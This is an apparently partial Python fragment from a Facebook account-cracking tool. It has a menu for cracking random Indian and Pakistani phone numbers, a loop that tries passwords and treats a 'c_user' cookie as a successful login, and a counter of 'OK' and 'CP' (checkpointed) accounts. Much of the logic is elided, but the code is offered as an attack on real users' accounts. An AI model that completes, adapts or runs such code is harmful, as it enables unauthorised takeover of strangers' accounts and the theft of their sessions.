...
def random_crack():
	os.system('clear')
	print(logo)
	print('[1]\033[1;34m CRACK INDIA🇮🇳 RANDOM NUMBERS')
	print('[2]\033[1;36m CRACK PAK 🇵🇰  RANDOM NUMBERS')
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\033[1;97m[\033[1;92mRIAZ\033[1;91m♡\033[1;92mRIAZ\033[1;97m] %s/%s  [\033[1;92mOK\033[1;97m-:\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m-:\033[1;91m%s\033[1;97m]'%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
	except:
		pass
